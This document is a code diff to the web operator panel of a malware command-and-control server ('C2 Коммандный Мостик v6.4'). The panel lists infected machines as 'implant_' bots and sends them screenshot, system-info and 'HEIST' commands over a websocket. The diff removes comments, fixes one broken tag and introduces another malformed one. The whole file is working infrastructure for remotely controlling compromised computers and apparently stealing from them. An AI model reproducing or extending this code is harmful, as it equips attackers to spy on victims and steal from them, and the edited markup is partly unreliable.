@@ -7,8 +7,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>C2 Коммандный Мостик v6.4</title>
     <style>
-        /* ... (все стили остаются без изменений) ... */
-        
         :root {
             --bg-color: #1a1a1c;
             --primary-color: #2e2e33;
@@ -316,9 +314,9 @@
                     <section>
                         <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
                         <div class="grid-controls">
-                            <button class="btn-action" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
-                            <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
-                            <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
+                            <button class="btn-action" onclick="sendCommand({action: 'screenshot'})" &gt;Скриншот</button>
+                                <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
+                                <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
                         </div>
                     </section>
                     <section>
@@ -354,16 +352,13 @@
         <div class="log-container">
             <div class="log-header" id="log-header">
                 <h3>Консоль логов</h3>
-                <;button id="toggle-log-btn">&times;</button>
+                <button id="toggle-log-btn">&times;</button>
             </div>
             <div id="log-list"></div>
         </div>
     </div>
 
     <script>
-        // ==============================================================================
-        // JAVASCRIPT-МОЗГ v6.4 (с защитой от саботажа)
-        // ==============================================================================
         const ui = {
             botList: document.getElementById('bot-list'),
             controlsWrapper: document.getElementById('controls-wrapper'),
@@ -433,7 +428,6 @@
             };
         }
 
-        // <<< ИСПРАВЛЕНА ЛОГИКА ОБНОВЛЕНИЯ >>>
         function updateBotList(bots) {
             log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
             const savedBotId = localStorage.getItem('lastSelectedBot');
@@ -444,24 +438,19 @@
                 const btn = document.createElement('button');
                 btn.textContent = botId.replace('implant_', '');
                 btn.className = 'btn-bot';
-                btn.onclick = () => selectBot(botId); // Клик пользователя всегда запрашивает детали
+                btn.onclick = () => selectBot(botId);
                 ui.botList.appendChild(btn);
             });
 
-            // Логика выбора после обновления списка
             if (currentSelected && bots.includes(currentSelected)) {
-                // Если текущий бот все еще в сети, просто пере-выделяем его БЕЗ запроса деталей
                 selectBot(currentSelected, false);
             } else if (savedBotId && bots.includes(savedBotId)) {
-                // Если текущего нет, но есть сохраненный, выбираем его С запросом деталей
                 selectBot(savedBotId, true);
             } else {
-                // Иначе выбираем первого в списке (или никого) С запросом деталей
                 selectBot(bots.length > 0 ? bots[0] : null, true);
             }
         }
 
-        // <<< ИСПРАВЛЕНА ЛОГИКА ВЫБОРА >>>
         function selectBot(botId, requestDetails = true) {
             selectedBotId = botId;
             if (botId) {
@@ -477,7 +466,6 @@
             if (botId) {
                 ui.controlsWrapper.style.display = 'block';
                 ui.selectedBotName.textContent = botId.replace('implant_', '');
-                // Запрашиваем детали ТОЛЬКО если это необходимо
                 if (requestDetails) {
                     log(`Запрос деталей для: ${botId.replace('implant_', '')}`);
                     socket.send(JSON.stringify({
